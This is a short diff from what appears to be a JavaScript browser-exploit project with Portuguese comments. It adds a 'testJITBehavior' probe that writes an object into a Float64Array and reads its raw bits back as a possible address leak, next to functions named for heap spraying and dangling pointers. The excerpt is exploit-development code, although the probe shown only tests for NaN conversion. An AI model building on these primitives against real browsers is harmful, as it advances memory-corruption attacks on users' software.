@@ -156,7 +156,30 @@ function sprayAndCreateDanglingPointer() {
 }
 
 
+// --- Início de runAllAdvancedTestsS3.mjs ---
+async function testJITBehavior() {
+    logS3("--- Iniciando Teste ---", 'test', 'testJITBehavior');
+    let test_buf = new ArrayBuffer(16);
+    let float_view = new Float64Array(test_buf);
+    let uint32_view = new Uint32Array(test_buf);
+    let some_obj = { a: 1, b: 2 };
 
+    logS3("Escrevendo um objeto em um Float64Array...", 'info', 'testJITBehavior');
+    float_view[0] = some_obj;
+
+    const low = uint32_view[0];
+    const high = uint32_view[1];
+    const leaked_val = new AdvancedInt64(low, high);
+    
+    logS3(`Bits lidos: high=0x${high.toString(16)}, low=0x${low.toString(16)} (Valor: ${leaked_val.toString(true)})`, 'leak', 'testJITBehavior');
+
+    if (high === 0x7ff80000 && low === 0) {
+        logS3("CONFIRMADO: O JIT converteu o objeto para NaN.", 'good', 'testJITBehavior');
+    } else {
+        logS3("INESPERADO: O JIT não converteu para NaN.", 'warn', 'testJITBehavior');
+    }
+    logS3("--- Teste de Comportamento do JIT Concluído ---", 'test', 'testJITBehavior');
+}
 
 async function runHeisenbugReproStrategy_TypedArrayVictim_R43() {
     const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_R43"; 
